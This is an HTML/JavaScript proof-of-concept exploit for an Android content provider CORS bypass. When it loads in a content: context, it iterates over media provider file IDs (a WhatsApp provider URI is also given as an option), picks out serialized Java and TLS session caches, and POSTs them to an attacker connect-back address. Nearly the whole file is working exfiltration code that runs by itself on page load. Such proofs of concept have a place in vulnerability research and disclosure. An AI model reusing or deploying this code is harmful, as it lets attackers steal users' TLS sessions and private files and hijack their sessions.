<!DOCTYPE html>
<html>
    <head>
        <title>Content Provider CORS bypass PoC</title>
        <style type="text/css">
            body {
                width: 100%;
                background-color: #282c34;
                color: #cccccc;
                font-size: 10px;
                font-family: consolas;
            }

            pre {
                margin: auto auto auto auto;
                padding: 10px 10px 10px 10px;
                width: 80%;
                white-space: pre-wrap;
                overflow-y: scroll;
                background-color: #1e2027;
            }

            h1 {
                color: #20b784;
                font-weight: bold;
            }
        </style>

        <script type="text/javascript">
            var EXTERNAL_MEDIA_PROVIDER_URI = "content://media/external/file";
            // var EXTERNAL_MEDIA_PROVIDER_URI = "content://com.whatsapp.provider.media/item";

            //
            // Serialized Java objects extracted from victim's device will be
            // sent at "<ATTACKER_CONNECTBACK_URI>/push".
            //
            // Log messages will be sent at "<ATTACKER_CONNECTBACK_URI>/log"
            //
            var ATTACKER_CONNECTBACK_URI = "<ADDRESS>";

            var attacker_xhr = new XMLHttpRequest();

            function append_log(element_id, message)
            {
                var now = new Date();
                var prefix = "[" + now.getHours() + ":" + now.getMinutes() + ":" + now.getSeconds() + "] ";

                element = document.getElementById(element_id);
                element.innerText += prefix + message + "\n";
                element.scrollTo(0, element.scrollHeight);
            }

            function log_debug(message)
            {
                append_log("debug_log", message);
            }

            function log(message)
            {
                append_log("log", message);
                console.log(message);

                //
                // Send log message back to the attacker.
                //
                // attacker_xhr.open("POST", ATTACKER_CONNECTBACK_URI + "/log");
                // attacker_xhr.overrideMimeType("text/plain");
                // attacker_xhr.send(message);
                //
            }


            //
            // Match the signature of serialized Java objects.
            //
            function is_watls_session(data)
            {
                return data.length >= 2 && data[0] == 0xac && data[1] == 0xed;
            }

            //
            // Match the signature of Android framework SSL session caches.
            //
            function is_ssl_session(data)
            {
                return data.length >= 4 && data[0] == 0x00 && data[1] == 0x00 &&
                    data[2] == 0x00 && data[3] == 0x03;
            }

            function analyze_data(data)
            {
                data = new Uint8Array(data);

                //
                // Filter leaked data. Only send back to the attacker data that
                // looks like serialized TLS sessions.
                //
                if(is_watls_session(data) || is_ssl_session(data))
                {
                    log("Detected serialized TLS session data");

                    //
                    // Send data back to the attacker.
                    //
                    attacker_xhr.open("POST", ATTACKER_CONNECTBACK_URI + "/push");
                    attacker_xhr.overrideMimeType("application/octet-stream");
                    attacker_xhr.send(data);
                }
            }


            function read_files(starti, endi)
            {
                var i = starti;

                var xhr = new XMLHttpRequest();

                xhr.responseType = "arraybuffer";

                xhr.onerror = function(event) {}

                xhr.onreadystatechange = function()
                {
                    if(this.readyState == 4)
                    {
                        if(this.status == 200 || this.status == 0)
                        {
                            var data = xhr.response;

                            if(data != null)
                            {
                                log("ID " + i + ", size " + data.byteLength);
                                analyze_data(data);
                            }
                            else
                            {
                                log_debug("ID " + i + " not found or blocked by CORS");
                            }
                        }
                        else
                            log_debug("ID " + i + " response status " + this.status);

                        i += 1;
                        read_file();
                    }
                }

                function read_file()
                {
                    if(i >= starti && i < endi)
                    {
                        xhr.open("GET", EXTERNAL_MEDIA_PROVIDER_URI + "/" + i);
                        xhr.send();
                    }
                    else
                        log("Finished");
                }

                read_file();
            }

            function exploit()
            {
                log("Exploit loaded in " + window.location.href);

                log("Connect-back URI is " + ATTACKER_CONNECTBACK_URI);

                if(window.location.protocol == "content:")
                {
                    var maxw = window.screen.availWidth;
                    var maxh = window.screen.availHeight;
                    log("Available screen dimensions " + maxw + "x" + maxh);

                    var element = document.getElementById("log");
                    element.style.height = maxh / 2 + "px";

                    element = document.getElementById("debug_log");
                    element.style.height = maxh / 2 + "px";

                    log("Starting up");
                    read_files(1, 1000);
                }
                else
                    log("Not a content provider");
            }
        </script>
    </head>
    <body id="body" onload="exploit();">
        <h1>Console</h1>
        <pre id="log"></pre>
        <br />
        <h1>Debug log</h1>
        <pre id="debug_log"></pre>
        <br />
    </body>
</html>
